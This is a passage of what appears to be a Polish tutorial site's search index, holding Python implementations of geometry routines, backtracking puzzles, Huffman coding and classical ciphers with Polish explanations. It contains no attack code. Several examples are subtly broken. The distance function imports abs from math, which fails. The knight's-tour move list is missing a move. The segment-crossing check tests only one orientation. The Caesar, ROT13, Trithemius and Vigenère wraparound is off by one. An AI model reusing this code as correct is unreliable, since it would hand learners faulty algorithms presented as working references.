prostej","text":""},{"location":"programming/python/algorithms/2d-geometry/point-line-distance/#opis-problemu","title":"Opis problemu","text":""},{"location":"programming/python/algorithms/2d-geometry/point-line-distance/#implementacja","title":"Implementacja","text":"<pre><code>from math import abs, sqrt\n\ndef point_line_distance(line_point1: dict, line_point2: dict, point: dict) -&gt; float:\n    a = line_point2[\"y\"] - line_point1[\"y\"]\n    b = line_point2[\"x\"] - line_point1[\"x\"]\n\n    return abs(a * (line_point1[\"x\"] - point[\"x\"]) + b * (point[\"y\"] - line_point1[\"y\"])) / sqrt(a * a + b * b)\n\nline_point1 = {\"x\": -3, \"y\": -4}\nline_point2 = {\"x\": 7, \"y\": 6}\npoint = {\"x\": -5, \"y\": -8}\n\ndistance = point_line_distance(line_point1, line_point2, point)\n\nprint(distance)\n</code></pre>"},{"location":"programming/python/algorithms/2d-geometry/point-line-distance/#opis-implementacji","title":"Opis implementacji","text":"<p>Funkcja <code>point_line_distance</code> przyjmuje jako argumenty wsp\u00f3\u0142rz\u0119dne dw\u00f3ch punkt\u00f3w (<code>line_point1</code>, <code>line_point2</code>) okre\u015blaj\u0105cych prost\u0105 oraz wsp\u00f3\u0142rz\u0119dne punktu (<code>point</code>), dla kt\u00f3rego obliczana jest odleg\u0142o\u015b\u0107. Na pocz\u0105tku obliczane s\u0105 r\u00f3\u017cnice mi\u0119dzy wsp\u00f3\u0142rz\u0119dnymi drugiego punktu a pierwszego punktu prostej. Warto\u015b\u0107 <code>a</code> to r\u00f3\u017cnica wsp\u00f3\u0142rz\u0119dnymi \\(y\\), a <code>b</code> to r\u00f3\u017cnica pomi\u0119dzy wsp\u00f3\u0142rz\u0119dnymi \\(x\\).</p> <p>Nast\u0119pnie obliczana jest odleg\u0142o\u015b\u0107 mi\u0119dzy punktem a prost\u0105 przy u\u017cyciu wzoru <code>abs(a * (line_point1[\"x\"] - point[\"x\"]) + b * (point[\"y\"] - line_point1[\"y\"])) / sqrt(a * a + b * b)</code>, gdzie:</p> <ul> <li><code>a * (line_point1[\"x\"] - point[\"x\"]) + b * (point[\"y\"] - line_point1[\"y\"])</code> oblicza numeryczn\u0105 warto\u015b\u0107 iloczynu skalarnego mi\u0119dzy wektorem normalnym do prostej a wektorem od pierwszego punktu prostej do badanego punktu,</li> <li><code>abs(...)</code> oblicza warto\u015b\u0107 bezwzgl\u0119dn\u0105 tego iloczynu skalarnego,</li> <li><code>sqrt(a * a + b * b)</code> oblicza d\u0142ugo\u015b\u0107 wektora normalnego do prostej.</li> </ul> <p>Wynik oblicze\u0144 jest zwracany jako warto\u015b\u0107 odleg\u0142o\u015bci.</p> <p>W przyk\u0142adzie podane s\u0105 konkretne warto\u015bci dla punktu <code>point</code> i prostych <code>(line_point1, line_point2)</code>. Funkcja <code>point_line_distance</code> jest wywo\u0142ywana z tymi warto\u015bciami, a obliczona odleg\u0142o\u015b\u0107 jest wy\u015bwietlana przy u\u017cyciu funkcji <code>print</code>.</p> <p>W wyniku wykonania tego kodu, zostanie wy\u015bwietlona odleg\u0142o\u015b\u0107 mi\u0119dzy punktem \\((-5, -8)\\) a prost\u0105 przechodz\u0105c\u0105 przez punkty \\((-3, -4)\\) i \\((7, 6)\\).</p>"},{"location":"programming/python/algorithms/2d-geometry/point-on-segment/","title":"Punkt na odcinku","text":""},{"location":"programming/python/algorithms/2d-geometry/point-on-segment/#opis-problemu","title":"Opis problemu","text":""},{"location":"programming/python/algorithms/2d-geometry/point-on-segment/#implementacja","title":"Implementacja","text":"<pre><code>class Point:\n    def __init__(self, x: int, y: int):\n        self.x = x\n        self.y = y\n\ndef det3(matrix: list) -&gt; int:\n    return (\n        matrix[0][0] * matrix[1][1] * matrix[2][2]\n        + matrix[1][0] * matrix[2][1] * matrix[0][2]\n        + matrix[2][0] * matrix[0][1] * matrix[1][2]\n        - matrix[0][2] * matrix[1][1] * matrix[2][0]\n        - matrix[0][1] * matrix[1][0] * matrix[2][2]\n        - matrix[0][0] * matrix[1][2] * matrix[2][1]\n    )\n\ndef point_on_segment(a: Point, b: Point, c: Point) -&gt; bool:\n    matrix = [[a.x, a.y, 1], [b.x, b.y, 1], [c.x, c.y, 1]]\n\n    if det3(matrix) != 0:\n        return False\n\n    return min(a.x, b.x) &lt;= c.x &lt;= max(a.x, b.x) and min(a.y, b.y) &lt;= c.y &lt;= max(\n        a.y, b.y\n    )\n\na = Point(1, 1)\nb = Point(5, 5)\nc = Point(2, 2)\n\nresult = point_on_segment(a, b, c)\n\nif result:\n    print(f\"Point ({c.x}, {c.y}) on segment [({a.x}, {a.y}), ({b.x}, {b.y})]\")\nelse:\n    print(f\"Point ({c.x}, {c.y}) not on segment [({a.x}, {a.y}), ({b.x}, {b.y})]\")\n</code></pre>"},{"location":"programming/python/algorithms/2d-geometry/segments-crossing/","title":"Przecinanie si\u0119 odcink\u00f3w","text":""},{"location":"programming/python/algorithms/2d-geometry/segments-crossing/#opis-problemu","title":"Opis problemu","text":""},{"location":"programming/python/algorithms/2d-geometry/segments-crossing/#implementacja","title":"Implementacja","text":"<pre><code>class Point:\n    def __init__(self, x: int, y: int):\n        self.x = x\n        self.y = y\n\ndef det3(matrix: list) -&gt; int:\n    return (\n        matrix[0][0] * matrix[1][1] * matrix[2][2]\n        + matrix[1][0] * matrix[2][1] * matrix[0][2]\n        + matrix[2][0] * matrix[0][1] * matrix[1][2]\n        - matrix[0][2] * matrix[1][1] * matrix[2][0]\n        - matrix[0][1] * matrix[1][0] * matrix[2][2]\n        - matrix[0][0] * matrix[1][2] * matrix[2][1]\n    )\n\ndef point_on_segment(a: Point, b: Point, c: Point) -&gt; bool:\n    matrix = [[a.x, a.y, 1], [b.x, b.y, 1], [c.x, c.y, 1]]\n\n    if det3(matrix) != 0:\n        return False\n\n    return min(a.x, b.x) &lt;= c.x &lt;= max(a.x, b.x) and min(a.y, b.y) &lt;= c.y &lt;= max(\n        a.y, b.y\n    )\n\ndef sgn(a: int) -&gt; int:\n    if a &lt; 0:\n        return -1\n    elif a &gt; 0:\n        return 1\n    else:\n        return 0\n\ndef segment_crossing(a: Point, b: Point, c: Point, d: Point) -&gt; bool:\n    return (\n        point_on_segment(a, b, c)\n        or point_on_segment(a, b, d)\n        or point_on_segment(c, d, a)\n        or point_on_segment(c, d, b)\n        or sgn(det3([[a.x, a.y, 1], [b.x, b.y, 1], [c.x, c.y, 1]]))\n        != sgn(det3([[a.x, a.y, 1], [b.x, b.y, 1], [d.x, d.y, 1]]))\n    )\n\na = Point(1, 1)\nb = Point(2, 2)\nc = Point(3, 3)\nd = Point(4, 4)\n\nresult = segment_crossing(a, b, c, d)\n\nif result:\n    print(\n        f\"Segments [({a.x}, {a.y}), ({b.x}, {b.y})] and [({c.x}, {c.y}), ({d.x}, {d.y})] cross\"\n    )\nelse:\n    print(\n        f\"Segments [({a.x}, {a.y}), ({b.x}, {b.y})] and [({c.x}, {c.y}), ({d.x}, {d.y})] do not cross\"\n    )\n</code></pre>"},{"location":"programming/python/algorithms/2d-geometry/triangle-condition/","title":"Warunek tr\u00f3jk\u0105ta","text":""},{"location":"programming/python/algorithms/2d-geometry/triangle-condition/#opis-problemu","title":"Opis problemu","text":""},{"location":"programming/python/algorithms/2d-geometry/triangle-condition/#implementacja","title":"Implementacja","text":"<pre><code>def can_create_triangle(a: int, b: int, c: int) -&gt; bool:\n    return a &lt; b + c and b &lt; a + c and c &lt; a + b\n\na = 3\nb = 8\nc = 9\n\nif can_create_triangle(a, b, c):\n    print(f\"Triangle can be created from {a}, {b} and {c}\")\nelse:\n    print(f\"Triangle cannot be created from {a}, {b} and {c}\")\n</code></pre>"},{"location":"programming/python/algorithms/backtracking/knights-tour/","title":"Problem skoczka","text":""},{"location":"programming/python/algorithms/backtracking/knights-tour/#opis-problemu","title":"Opis problemu","text":""},{"location":"programming/python/algorithms/backtracking/knights-tour/#implementacja","title":"Implementacja","text":"<pre><code>from pprint import pprint\n\nmoves_list = [(-1, -2), (1, -2), (2, -1), (2, 1), (-2, -1), (-1, 2), (1, 2)]\n\ndef kinght_tour(n: int, chessboard: list, visited_count: int, row: int, column: int) -&gt; tuple:\n    chessboard[row][column] = visited_count - 1\n\n    if visited_count == n * n:\n        return True, chessboard\n\n    for move_row, move_column in moves_list:\n        new_row = row + move_row\n        new_column = column + move_column\n        if 0 &lt;= new_row &lt; n and 0 &lt;= new_column &lt; n and chessboard[new_row][new_column] == -1:\n            result_value, result_chessboard = kinght_tour(n, chessboard, visited_count + 1, new_row, new_column)\n            if result_value:\n                return True, result_chessboard\n\n    chessboard[row][column] = -1\n    return False, None\n\nn = 5\nchessboard = [[-1] * n for _ in range(n)]\n\nresult_value, result_chessboard = kinght_tour(n, chessboard, 1, 0, 0)\n\nif result_value:\n    print(\"Result found:\")\n    pprint(result_chessboard)\nelse:\n    print(\"No result\")\n</code></pre>"},{"location":"programming/python/algorithms/backtracking/n-queens/","title":"Problem n kr\u00f3lowych","text":""},{"location":"programming/python/algorithms/backtracking/n-queens/#opis-problemu","title":"Opis problemu","text":""},{"location":"programming/python/algorithms/backtracking/n-queens/#implementacja","title":"Implementacja","text":"<pre><code>from pprint import pprint\n\ndef find_solution(n: int, queen_id: int, positions: list) -&gt; bool:\n    if queen_id == n:\n        return True\n\n    for i in range(n):\n        if not check_new_position(queen_id, i, positions):\n            continue\n\n        positions[queen_id] = i\n\n        if find_solution(n, queen_id + 1, positions):\n            return True\n\n    return False\n\ndef check_new_position(x: int, y: int, positions: list) -&gt; bool:\n    for i in range(x):\n        if positions[i] == y:\n            return False\n\n        if y - positions[i] == x - i or y - positions[i] == i - x:\n            return False\n\n    return True\n\ndef print_checkboard(n: int, positions: list):\n    board = [[0] * n for _ in range(n)]\n\n    for i in range(n):\n        board[positions[i]][i] = 1\n\n    pprint(board)\n\nn = 5\npositions = [0] * n\n\nresult = find_solution(n, 0, positions)\n\nif result:\n    print(f\"Positions: {positions}\")\n    print(\"Checkboard:\")\n    print_checkboard(n, positions)\nelse:\n    print(\"No result exists\")\n</code></pre>"},{"location":"programming/python/algorithms/backtracking/permutations/","title":"Permutacje","text":""},{"location":"programming/python/algorithms/backtracking/permutations/#opis-problemu","title":"Opis problemu","text":""},{"location":"programming/python/algorithms/backtracking/permutations/#implementacja","title":"Implementacja","text":"<pre><code>def permutation(elements, start, stop):\n    if start == stop:\n        print(elements)\n        return\n\n    for i in range(start, stop + 1):\n        elements[start], elements[i] = elements[i], elements[start]\n\n        permutation(elements, start + 1, stop)\n\n        elements[start], elements[i] = elements[i], elements[start]\n\nelements = list(range(1, 4))\n\nprint(\"Permutacje:\")\npermutation(elements, 0, 2)\n</code></pre>"},{"location":"programming/python/algorithms/coding-and-compression/ascii/","title":"Kod ASCII","text":""},{"location":"programming/python/algorithms/coding-and-compression/ascii/#opis-problemu","title":"Opis problemu","text":""},{"location":"programming/python/algorithms/coding-and-compression/ascii/#podstawowa-tablica-ascii","title":"Podstawowa tablica ASCII","text":""},{"location":"programming/python/algorithms/coding-and-compression/ascii/#implementacja","title":"Implementacja","text":"<pre><code>for i in range(128):\n    print(chr(i))\n</code></pre>"},{"location":"programming/python/algorithms/coding-and-compression/ascii/#opis-implementacji","title":"Opis implementacji","text":"<p>Podstawowa tablica ASCII zawiera 128 znak\u00f3w numerowanych od zera. Przechodzimy wi\u0119c p\u0119tl\u0105 od 0 do 127 w\u0142\u0105cznie (linia 1) i, korzystaj\u0105c z funkcji <code>chr</code> zamieniaj\u0105cej liczb\u0119 na odpowiadaj\u0105cy jej znak z tablicy ASCII, wypisujemy kolejne znaki (linia 2).</p>"},{"location":"programming/python/algorithms/coding-and-compression/ascii/#rozszerzona-tablica-ascii","title":"Rozszerzona tablica ASCII","text":""},{"location":"programming/python/algorithms/coding-and-compression/ascii/#implementacja_1","title":"Implementacja","text":"<pre><code>for i in range(256):\n    print(chr(i))\n</code></pre>"},{"location":"programming/python/algorithms/coding-and-compression/ascii/#opis-implementacji_1","title":"Opis implementacji","text":"<p>Rozszerzona tablica ASCII zawiera 256 znak\u00f3w numerowanych od zera. Przechodzimy wi\u0119c p\u0119tl\u0105 od 0 do 255 w\u0142\u0105cznie (linia 1) i, korzystaj\u0105c z funkcji <code>chr</code> zamieniaj\u0105cej liczb\u0119 na odpowiadaj\u0105cy jej znak z tablicy ASCII, wypisujemy kolejne znaki (linia 2).</p>"},{"location":"programming/python/algorithms/coding-and-compression/huffman-coding/","title":"Kody Huffmana","text":""},{"location":"programming/python/algorithms/coding-and-compression/huffman-coding/#opis-problemu","title":"Opis problemu","text":""},{"location":"programming/python/algorithms/coding-and-compression/huffman-coding/#implementacja","title":"Implementacja","text":"<pre><code>class Node:\n    def __init__(self, letter = \"\", value = 0, left = None, right = None):\n        self.letter = letter\n        self.value = value\n        self.left = left\n        self.right = right\n\ndef create_tree(text):\n    nodes_list = []\n    letters_set = set(text)\n    nodes_list = [Node(letter, text.count(letter)) for letter in letters_set]\n    nodes_list.sort(key=lambda el: el.value)\n    while len(nodes_list) &gt; 1:\n        first = nodes_list.pop(0)\n        second = nodes_list.pop(0)\n        new_node = Node(\"\", first.value + second.value, first, second)\n        nodes_list.append(new_node)\n        nodes_list.sort(key=lambda el: el.value)\n\n    return nodes_list[0]\n\ndef create_codes(tree, codes, path):\n    if tree.left is None and tree.right is None:\n        codes[tree.letter] = path\n        return\n\n    if tree.left is not None:\n        create_codes(tree.left, codes, path + \"0\")\n\n    if tree.right is not None:\n        create_codes(tree.right, codes, path + \"1\")\n\ndef compress(text, codes):\n    compressed = \"\"\n    for letter in text:\n        compressed += codes[letter]\n\n    return compressed\n\ndef decompress(compressed, tree):\n    decompressed = \"\"\n    current_node = tree\n    for bit in compressed:\n        if bit == \"0\":\n            current_node = current_node.left\n        elif bit == \"1\":\n            current_node = current_node.right\n\n        if current_node.left is None and current_node.right is None:\n            decompressed += current_node.letter\n            current_node = tree\n\n    return decompressed\n\ntext = \"papuga\"\ntree = create_tree(text)\ncodes = dict()\ncreate_codes(tree, codes, \"\")\n\nprint(\"Codes:\", codes)\n\ncompressed = compress(text, codes)\nprint(\"Compressed:\", compressed)\n\ndecompressed = decompress(compressed, tree)\nprint(\"Decompressed:\", decompressed)\n</code></pre>"},{"location":"programming/python/algorithms/coding-and-compression/huffman-coding/#opis-implementacji","title":"Opis implementacji","text":"<p>Klasa <code>Node</code> reprezentuje w\u0119ze\u0142 w drzewie Huffmana. Ka\u017cdy w\u0119ze\u0142 przechowuje liter\u0119 (<code>letter</code>), warto\u015b\u0107 (<code>value</code>), lewe poddrzewo (<code>left</code>) i prawe poddrzewo (<code>right</code>).</p> <p>Funkcja <code>create_tree</code> tworzy drzewo Huffmana na podstawie podanego tekstu. Na pocz\u0105tku tworzona jest pusta lista <code>nodes_list</code>, kt\u00f3ra b\u0119dzie przechowywa\u0107 w\u0119z\u0142y drzewa. Nast\u0119pnie tworzony jest zbi\u00f3r unikalnych liter z tekstu. Dla ka\u017cdej litery w zbiorze, tworzony jest w\u0119ze\u0142 i dodawany do listy <code>nodes_list</code>, gdzie warto\u015b\u0107 w\u0119z\u0142a to liczba wyst\u0105pie\u0144 danej litery w tek\u015bcie. W\u0119z\u0142y s\u0105 sortowane rosn\u0105co wzgl\u0119dem warto\u015bci. Nast\u0119pnie, w p\u0119tli, dop\u00f3ki lista <code>nodes_list</code> ma wi\u0119cej ni\u017c jeden element, usuwane s\u0105 dwa pierwsze w\u0119z\u0142y z najmniejszymi warto\u015bciami, a nast\u0119pnie tworzony jest nowy w\u0119ze\u0142, kt\u00f3ry jest sum\u0105 warto\u015bci tych dw\u00f3ch w\u0119z\u0142\u00f3w. Nowy w\u0119ze\u0142 jest dodawany do listy <code>nodes_list</code> i lista jest sortowana ponownie. Proces ten jest powtarzany, a\u017c do momentu, gdy w li\u015bcie <code>nodes_list</code> pozostaje tylko jeden w\u0119ze\u0142, kt\u00f3ry jest korzeniem drzewa. Ten korze\u0144 jest zwracany przez funkcj\u0119 <code>create_tree</code>.</p> <p>Funkcja <code>create_codes</code> tworzy kodowanie dla ka\u017cdej litery na podstawie drzewa Huffmana. Funkcja jest rekurencyjna. Je\u015bli dany w\u0119ze\u0142 nie ma dzieci (lewej i prawej ga\u0142\u0119zi), oznacza to, \u017ce reprezentuje on konkretn\u0105 liter\u0119. W takim przypadku przypisywany jest kod (\u015bcie\u017cka) do tej litery w s\u0142owniku <code>codes</code>. Je\u015bli dany w\u0119ze\u0142 ma lewego potomka, rekurencyjnie wywo\u0142ywana jest funkcja <code>create_codes</code> dla lewego potomka, a do kodu (\u015bcie\u017cki) dodawane jest \"0\". Je\u015bli dany w\u0119ze\u0142 ma prawego potomka, rekurencyjnie wywo\u0142ywana jest funkcja <code>create_codes</code> dla prawego potomka, a do kodu (\u015bcie\u017cki) dodawane jest \"1\".</p> <p>Funkcja <code>compress</code> kompresuje tekst na podstawie utworzonych kod\u00f3w dla liter. Przechodz\u0105c przez ka\u017cd\u0105 liter\u0119 w tek\u015bcie, kod dla danej litery jest dodawany do zmiennej <code>compressed</code>.</p> <p>Funkcja <code>decompress</code> przyjmuje skompresowany tekst (<code>compressed</code>) oraz korze\u0144 drzewa Huffmana (<code>tree</code>). Iteruje po ka\u017cdym bicie w skompresowanym tek\u015bcie. Je\u015bli bit jest r\u00f3wny \"0\", przechodzi do lewego potomka w\u0119z\u0142a bie\u017c\u0105cego (<code>current_node</code>), a je\u015bli bit jest r\u00f3wny \"1\", przechodzi do prawego potomka. Gdy osi\u0105gnie li\u015b\u0107 drzewa (czyli w\u0119ze\u0142, kt\u00f3ry nie ma dzieci), dodaje jego liter\u0119 do dekompresowanego tekstu (<code>decompressed</code>) i przechodzi z powrotem do korzenia drzewa. Proces ten powtarza si\u0119, a\u017c do przetworzenia wszystkich bit\u00f3w skompresowanego tekstu.</p> <p>W przyk\u0142adzie, tekst \"papuga\" jest kompresowany. Na pocz\u0105tku tworzone jest drzewo Huffmana za pomoc\u0105 funkcji <code>create_tree</code>. Nast\u0119pnie za pomoc\u0105 funkcji <code>create_codes</code> tworzone s\u0105 kody dla liter, kt\u00f3re s\u0105 przechowywane w s\u0142owniku <code>codes</code>. Nast\u0119pnie tekst jest kompresowany funkcj\u0105 <code>compress</code> i wynikowy skompresowany tekst jest wy\u015bwietlany. Na ko\u0144cu skompresowany tekst jest dekompresowany funkcj\u0105 <code>decompress</code> i wynikowy zdekompresowany tekst jest wy\u015bwietlany.</p>"},{"location":"programming/python/algorithms/cryptography/beaufort/","title":"Szyfr Beauforta","text":""},{"location":"programming/python/algorithms/cryptography/beaufort/#opis-problemu","title":"Opis problemu","text":""},{"location":"programming/python/algorithms/cryptography/beaufort/#szyfrowanie-i-deszyfrowanie","title":"Szyfrowanie i deszyfrowanie","text":"<pre><code>def encode(message: str, key: str) -&gt; str:\n    encoded = \"\"\n    letter = key_index = k = 0\n\n    for character in message:\n        k = 26 - (ord(character) - ord(\"a\")) + (ord(key[key_index]) - ord(\"a\"))\n        k %= 26\n        letter = ord(\"a\") + k\n\n        if letter &gt; ord(\"z\"):\n            letter = ord(\"a\") + letter - ord(\"z\")\n\n        encoded += chr(letter)\n        key_index += 1\n        key_index %= len(key)\n\n    return encoded\n\nmessage = \"computerscience\"\nkey = \"cat\"\n\nencoded = encode(message, key)\ndecoded = encode(encoded, key)\n\nprint(f\"Encoded: {encoded}\")\nprint(f\"Decoded: {decoded}\")\n</code></pre>"},{"location":"programming/python/algorithms/cryptography/caesar/","title":"Szyfr Cezara","text":""},{"location":"programming/python/algorithms/cryptography/caesar/#opis-problemu","title":"Opis problemu","text":""},{"location":"programming/python/algorithms/cryptography/caesar/#szyfrowanie","title":"Szyfrowanie","text":"<pre><code>def encrypt_caesar(message: str, key: int) -&gt; str:\n    encrypted = \"\"\n\n    for letter in message:\n        encrypted_letter = ord(letter) + key\n        if encrypted_letter &gt; ord(\"z\"):\n            encrypted_letter = ord(\"a\") + encrypted_letter - ord(\"z\")\n\n        encrypted += chr(encrypted_letter)\n\n    return encrypted\n\nmessage = \"computerscience\"\nkey = 3\n\nencrypted = encrypt_caesar(message, key)\n\nprint(encrypted)\n</code></pre>"},{"location":"programming/python/algorithms/cryptography/caesar/#deszyfrowanie","title":"Deszyfrowanie","text":"<pre><code>def decrypt_caesar(message: str, key: int) -&gt; str:\n    decrypted = \"\"\n\n    for letter in message:\n        decrypted_letter = ord(letter) - key\n        if decrypted_letter &lt; ord(\"a\"):\n            decrypted_letter = ord(\"z\") - (ord(\"a\") - decrypted_letter)\n\n        decrypted += chr(decrypted_letter)\n\n    return decrypted\n\nmessage = \"frpsxwhuvflhqfh\"\nkey = 3\n\ndecrypted = decrypt_caesar(message, key)\n\nprint(decrypted)\n</code></pre>"},{"location":"programming/python/algorithms/cryptography/playfair/","title":"Szyfr Playfaira","text":""},{"location":"programming/python/algorithms/cryptography/playfair/#opis-problemu","title":"Opis problemu","text":""},{"location":"programming/python/algorithms/cryptography/playfair/#szyfrowanie","title":"Szyfrowanie","text":"<pre><code>def find(letter: str, tab: list) -&gt; (int, int):\n    for i in range(6):\n        for j in range(6):\n            if letter == tab[i][j]:\n                return i, j\n\ndef create_order(key: str) -&gt; list:\n    alphabet = [\"a\", \"\u0105\", \"b\", \"c\", \"\u0107\", \"d\", \"e\", \"\u0119\", \"f\", \"g\", \"h\", \"i\", \"j\", \"k\", \"l\", \"\u0142\", \"m\", \"n\", \"\u0144\", \"o\", \"\u00f3\",\n                \"p\", \"q\", \"r\", \"s\", \"\u015b\", \"t\", \"u\", \"v\", \"w\", \"x\", \"y\", \"z\", \"\u017a\", \"\u017c\", \" \"]\n    order = []\n    for letter in key:\n        if letter in alphabet:\n            alphabet.remove(letter)\n            order.append(letter)\n\n    order.extend(alphabet)\n\n    return order\n\ndef encode(key: str, message: str):\n    order = create_order(key)\n\n    tab = [[order[i * 6 + j] for j in range(6)] for i in range(6)]\n\n    if len(message) % 2 == 1:\n        message += \" \"\n\n    result = \"\"\n    for i in range(0, len(message), 2):\n        letter1, letter2 = message[i], message[i + 1]\n        x1, y1 = find(letter1, tab)\n        x2, y2 = find(letter2, tab)\n\n        if y1 == y2:\n            crypto1 = tab[x1][(y1 + 1) % 6]\n            crypto2 = tab[x2][(y2 + 1) % 6]\n        elif x1 == x2:\n            crypto1 = tab[(x1 + 1) % 6][y1]\n            crypto2 = tab[(x2 + 1) % 6][y2]\n        else:\n            crypto1 = tab[x1][y2]\n            crypto2 = tab[x2][y1]\n\n        result += crypto1 + crypto2\n\n    return result\n\nkey = \"computer\"\nmessage = \"science\"\n\nencoded = encode(key, message)\n\nprint(encoded)\n</code></pre>"},{"location":"programming/python/algorithms/cryptography/playfair/#deszyfrowanie","title":"Deszyfrowanie","text":"<pre><code>def find(letter: str, tab: list) -&gt; (int, int):\n    for i in range(6):\n        for j in range(6):\n            if letter == tab[i][j]:\n                return i, j\n\ndef create_order(key: str) -&gt; list:\n    alphabet = [\"a\", \"\u0105\", \"b\", \"c\", \"\u0107\", \"d\", \"e\", \"\u0119\", \"f\", \"g\", \"h\", \"i\", \"j\", \"k\", \"l\", \"\u0142\", \"m\", \"n\", \"\u0144\", \"o\", \"\u00f3\",\n                \"p\", \"q\", \"r\", \"s\", \"\u015b\", \"t\", \"u\", \"v\", \"w\", \"x\", \"y\", \"z\", \"\u017a\", \"\u017c\", \" \"]\n    order = []\n    for letter in key:\n        if letter in alphabet:\n            alphabet.remove(letter)\n            order.append(letter)\n\n    order.extend(alphabet)\n\n    return order\n\ndef decode(key: str, message: str):\n    order = create_order(key)\n\n    tab = [[order[i * 6 + j] for j in range(6)] for i in range(6)]\n\n    if len(message) % 2 == 1:\n        message += \" \"\n\n    result = \"\"\n    for i in range(0, len(message), 2):\n        letter1, letter2 = message[i], message[i + 1]\n        x1, y1 = find(letter1, tab)\n        x2, y2 = find(letter2, tab)\n\n        if y1 == y2:\n            crypto1 = tab[x1][y1 - 1]\n            crypto2 = tab[x2][y2 - 1]\n        elif x1 == x2:\n            crypto1 = tab[x1 - 1][y1]\n            crypto2 = tab[x2 - 1][y2]\n        else:\n            crypto1 = tab[x1][y2]\n            crypto2 = tab[x2][y1]\n\n        result += crypto1 + crypto2\n\n    return result\n\nkey = \"computer\"\nmessage = \"\u00f3md\u0107ju\u0107x\"\n\ndecoded = decode(key, message)\n\nprint(decoded)\n</code></pre>"},{"location":"programming/python/algorithms/cryptography/rail-fence/","title":"Szyfr p\u0142otkowy","text":""},{"location":"programming/python/algorithms/cryptography/rail-fence/#opis-problemu","title":"Opis problemu","text":""},{"location":"programming/python/algorithms/cryptography/rail-fence/#szyfrowanie","title":"Szyfrowanie","text":"<pre><code>def encrypt_rail_fence(message: str, key: int) -&gt; str:\n    encrypted = \"\"\n\n    for k in range(key):\n        if k == key - 1:\n            jump = (key - 1) * 2\n        else:\n            jump = (key - (k + 1)) * 2\n\n        for i in range(k, len(message), jump):\n            encrypted += message[i]\n\n    return encrypted\n\nmessage = \"computer science\"\nkey = 3\n\nencrypted = encrypt_rail_fence(message, key)\n\nprint(encrypted)\n</code></pre>"},{"location":"programming/python/algorithms/cryptography/rail-fence/#deszyfrowanie","title":"Deszyfrowanie","text":"<pre><code>def decrypt_rail_fence(message: str, key: int) -&gt; str:\n    decrypted = list(message)\n    j = 0\n\n    for k in range(key):\n        if k == key - 1:\n            jump = (key - 1) * 2\n        else:\n            jump = (key - (k + 1)) * 2\n\n        for i in range(k, len(message), jump):\n            decrypted[i] = message[j]\n            j += 1\n\n    return \"\".join(decrypted)\n\nmessage = \"cu eoptrsinemecc\"\nkey = 3\n\ndecrypted = decrypt_rail_fence(message, key)\n\nprint(decrypted)\n</code></pre>"},{"location":"programming/python/algorithms/cryptography/rot13/","title":"Szyfr ROT13","text":""},{"location":"programming/python/algorithms/cryptography/rot13/#opis-problemu","title":"Opis problemu","text":""},{"location":"programming/python/algorithms/cryptography/rot13/#szyfrowanie","title":"Szyfrowanie","text":"<pre><code>def encrypt_rot13(message: str) -&gt; str:\n    encrypted = \"\"\n\n    for letter in message:\n        encrypted_letter = ord(letter) + 13\n\n        if encrypted_letter &gt; ord(\"z\"):\n            encrypted_letter = ord(\"a\") + encrypted_letter - ord(\"z\")\n\n        encrypted += chr(encrypted_letter)\n\n    return encrypted\n\nmessage = \"computerscience\"\n\nencrypted = encrypt_rot13(message)\n\nprint(encrypted)\n</code></pre>"},{"location":"programming/python/algorithms/cryptography/rot13/#deszyfrowanie","title":"Deszyfrowanie","text":"<pre><code>def decrypt_rot13(message: str) -&gt; str:\n    decrypted = \"\"\n\n    for letter in message:\n        decrypted_letter = ord(letter) - 13\n\n        if decrypted_letter &lt; ord(\"a\"):\n            decrypted_letter = ord(\"z\") - (ord(\"a\") - decrypted_letter)\n\n        decrypted += chr(decrypted_letter)\n\n    return decrypted\n\nmessage = \"pczdihrfgpvrbpr\"\n\ndecrypted = decrypt_rot13(message)\n\nprint(decrypted)\n</code></pre>"},{"location":"programming/python/algorithms/cryptography/trithemius/","title":"Szyfr Trithemius\"a","text":""},{"location":"programming/python/algorithms/cryptography/trithemius/#opis-problemu","title":"Opis problemu","text":""},{"location":"programming/python/algorithms/cryptography/trithemius/#szyfrowanie","title":"Szyfrowanie","text":"<pre><code>def encrypt_trithemius(message: str) -&gt; bool:\n    encrypted = \"\"\n    k = 0\n\n    for letter in message:\n        encrypted_letter = ord(letter) + k\n\n        if encrypted_letter &gt; ord(\"z\"):\n            encrypted_letter = ord(\"a\") + encrypted_letter - ord(\"z\")\n\n        encrypted += chr(encrypted_letter)\n        k += 1\n        k %= 26\n\n    return encrypted\n\nmessage = \"computerscience\"\n\nencrypted = encrypt_trithemius(message)\n\nprint(encrypted)\n</code></pre>"},{"location":"programming/python/algorithms/cryptography/trithemius/#deszyfrowanie","title":"Deszyfrowanie","text":"<pre><code>def decrypt_trithemius(message: str) -&gt; str:\n    decrypted = \"\"\n    k = 0\n\n    for letter in message:   \n        decrypted_letter = ord(letter) - k\n\n        if decrypted_letter &lt; ord(\"a\"):\n            decrypted_letter = ord(\"z\") - (ord(\"a\") - decrypted_letter)\n\n        decrypted += chr(decrypted_letter)\n        k += 1\n        k %= 26\n\n    return decrypted\n\nmessage = \"cposyykyblspzps\"\n\ndecrypted = decrypt_trithemius(message)\n\nprint(decrypted)\n</code></pre>"},{"location":"programming/python/algorithms/cryptography/vigenere/","title":"Szyfr Vigenere\"a","text":""},{"location":"programming/python/algorithms/cryptography/vigenere/#opis-problemu","title":"Opis problemu","text":""},{"location":"programming/python/algorithms/cryptography/vigenere/#szyfrowanie","title":"Szyfrowanie","text":"<pre><code>def encrypt_vigenere(message: str, key: str) -&gt; str:\n    encrypted = \"\"\n    key_index = 0\n\n    for letter in message:            \n        k = ord(key[key_index]) - ord(\"a\")\n        encrypted_letter = ord(letter) + k\n\n        if encrypted_letter &gt; ord(\"z\"):\n            encrypted_letter = ord(\"a\") + encrypted_letter - ord(\"z\")\n\n        encrypted += chr(encrypted_letter)\n        key_index += 1\n        key_index %= len(key)\n\n    return encrypted\n\nmessage = \"computerscience\"\nkey = \"cat\"\n\nencrypted = encrypt_vigenere(message, key)\n\nprint(encrypted)\n</code></pre>"},{"location":"programming/python/algorithms/cryptography/vigenere/#deszyfrowanie","title":"Deszyfrowanie","text":"<pre><code>def decrypt_vigenere(message: str, key: str) -&gt; str:\n    decrypted = \"\"\n    key_index = 0\n\n    for letter in message:\n        k = ord(key[key_index]) - ord(\"a\")\n        decrypted_letter = ord(letter) - k\n\n        if decrypted_letter &lt; ord(\"a\"):\n            decrypted_letter = ord(\"z\") - (ord(\"a\") - decrypted_letter)\n\n        decrypted += chr(decrypted_letter)\n        key_index += 1\n        key_index %= len(key)\n\n    return decrypted\n\nmessage = 